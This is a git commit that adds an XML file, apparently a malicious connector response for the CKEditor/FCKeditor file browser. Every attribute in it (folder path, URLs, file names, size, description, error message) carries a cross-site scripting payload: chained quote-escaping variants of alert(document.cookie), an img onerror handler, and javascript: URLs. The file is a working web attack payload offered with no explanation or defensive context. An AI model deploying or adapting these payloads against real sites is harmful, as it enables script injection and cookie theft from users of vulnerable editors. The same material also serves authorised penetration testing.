fc76eda723530d022bb6e3d5b87316902ebb96ba
neolead <janvarry@gmail.com>
2022-10-29 23:34:13 +0300

    Create ckeditor-payload1.xml.php

---
+++ ckeditor-payload1.xml.php
@@ -0,0 +1,18 @@
+
+<Connector>
+	<CurrentFolder 
+		path="&apos;+alert(document.cookie)+&apos;&amp;#39+alert(document.cookie)+&amp;#39&amp;#x27+alert(document.cookie)+&amp;#x27&quot;+alert(document.cookie)+&quot;&amp;#34+alert(document.cookie)+&amp;#34&amp;#x22+alert(document.cookie)+&amp;#x22&gt;&lt;img src=x onerror=alert(document.cookie)&gt;"
+		url="javascript:alert(document.cookie);//&apos;+alert(document.cookie)+&apos;&amp;#39+alert(document.cookie)+&amp;#39&amp;#x27+alert(document.cookie)+&amp;#x27&quot;+alert(document.cookie)+&quot;&amp;#34+alert(document.cookie)+&amp;#34&amp;#x22+alert(document.cookie)+&amp;#x22&gt;&lt;img src=x onerror=alert(document.cookie)&gt;" />
+	<Folders>
+		<Folder name="&apos;+alert(document.cookie)+&apos;&amp;#39+alert(document.cookie)+&amp;#39&amp;#x27+alert(document.cookie)+&amp;#x27&quot;+alert(document.cookie)+&quot;&amp;#34+alert(document.cookie)+&amp;#34&amp;#x22+alert(document.cookie)+&amp;#x22&gt;&lt;img src=x onerror=alert(document.cookie)&gt;" />
+	</Folders>
+	<Files>
+		<File 
+			name="&apos;+alert(document.cookie)+&apos;&amp;#39+alert(document.cookie)+&amp;#39&amp;#x27+alert(document.cookie)+&amp;#x27&quot;+alert(document.cookie)+&quot;&amp;#34+alert(document.cookie)+&amp;#34&amp;#x22+alert(document.cookie)+&amp;#x22&gt;&lt;img src=x onerror=alert(document.cookie)&gt;"
+			size="&apos;+alert(document.cookie)+&apos;&amp;#39+alert(document.cookie)+&amp;#39&amp;#x27+alert(document.cookie)+&amp;#x27&quot;+alert(document.cookie)+&quot;&amp;#34+alert(document.cookie)+&amp;#34&amp;#x22+alert(document.cookie)+&amp;#x22&gt;&lt;img src=x onerror=alert(document.cookie)&gt;"
+			desc="pos;+alert(document.cookie)+&apos;&amp;#39+alert(document.cookie)+&amp;#39&amp;#x27+alert(document.cookie)+&amp;#x27&quot;+alert(document.cookie)+&quot;&amp;#34+alert(document.cookie)+&amp;#34&amp;#x22+alert(document.cookie)+&amp;#x22&gt;&lt;img src=x onerror=alert(document.cookie)&gt;"
+			errorMessage="&apos;+alert(document.cookie)+&apos;&amp;#39+alert(document.cookie)+&amp;#39&amp;#x27+alert(document.cookie)+&amp;#x27&quot;+alert(document.cookie)+&quot;&amp;#34+alert(document.cookie)+&amp;#34&amp;#x22+alert(document.cookie)+&amp;#x22&gt;&lt;img src=x onerror=alert(document.cookie)&gt;"
+			url="javascript:alert(document.cookie)//&apos;+alert(document.cookie)+&apos;&amp;#39+alert(document.cookie)+&amp;#39&amp;#x27+alert(document.cookie)+&amp;#x27&quot;+alert(document.cookie)+&quot;&amp;#34+alert(document.cookie)+&amp;#34&amp;#x22+alert(document.cookie)+&amp;#x22&gt;&lt;img src=x onerror=alert(document.cookie)&gt;"
+		/>
+	</Files>
+</Connector>
